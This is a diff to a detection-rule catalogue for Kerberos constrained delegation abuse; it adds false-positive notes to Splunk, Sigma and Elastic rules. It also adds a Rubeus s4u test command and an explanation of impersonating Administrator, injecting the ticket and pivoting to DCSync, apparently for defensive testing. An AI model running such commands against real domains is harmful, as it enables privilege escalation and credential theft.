@@ -130,7 +130,8 @@
         "confidence": "medium",
         "log_ids": [
           "4769"
-        ]
+        ],
+        "false_positives": "Normal service ticket requests for file shares, SQL, etc."
       },
       {
         "platform": "splunk",
@@ -144,7 +145,8 @@
         "confidence": "medium",
         "log_ids": [
           "4769"
-        ]
+        ],
+        "false_positives": "Normal service ticket requests for file shares, SQL, etc."
       },
       {
         "platform": "splunk",
@@ -158,7 +160,8 @@
         "confidence": "medium",
         "log_ids": [
           "1"
-        ]
+        ],
+        "false_positives": "Authorized Kerberos testing by security teams"
       },
       {
         "platform": "sigma",
@@ -169,7 +172,8 @@
           "T1558"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate admin activity using the same Windows APIs or tools"
       },
       {
         "platform": "sigma",
@@ -180,7 +184,8 @@
           "T1558"
         ],
         "fidelity": "signature",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Authorized Kerberos testing by security teams"
       },
       {
         "platform": "elastic",
@@ -190,7 +195,9 @@
         "attack": [
           "T1558"
         ],
-        "fidelity": "behavioral"
+        "fidelity": "behavioral",
+        "false_positives": "Normal service ticket requests for file shares, SQL, etc.",
+        "confidence": "high"
       }
     ],
     "visibility": {
@@ -230,7 +237,8 @@
         "Check for credential dumping artifacts (LSASS access, SAM hive reads, Kerberos anomalies)",
         "Verify whether the activity matches known administrative baselines or change windows",
         "If confirmed malicious, isolate the host and escalate to incident response"
-      ]
+      ],
+      "test_command": "Rubeus.exe s4u /user:<user> /rc4:<nt_hash> /impersonateuser:Administrator /msdsspn:'<spn>' /nowrap"
     }
   },
   "explain": "Abuses msDS-AllowedToDelegateTo (constrained delegation) to impersonate any user to the allowed service:\n  s4u                       run S4U2Self + S4U2Proxy\n  /user:<user>             the account trusted for delegation (its identity)\n  /rc4:<nt_hash>           that account's hash to authenticate\n  /impersonateuser:Administrator   the user to impersonate (S4U2Self)\n  /msdsspn:'<spn>'         the service it is allowed to delegate to\n  /nowrap                   single-line ticket output\nInject the resulting service ticket (Rubeus ptt) to access that SPN as Administrator; /altservice swaps the service class (e.g. to ldap for DCSync)."
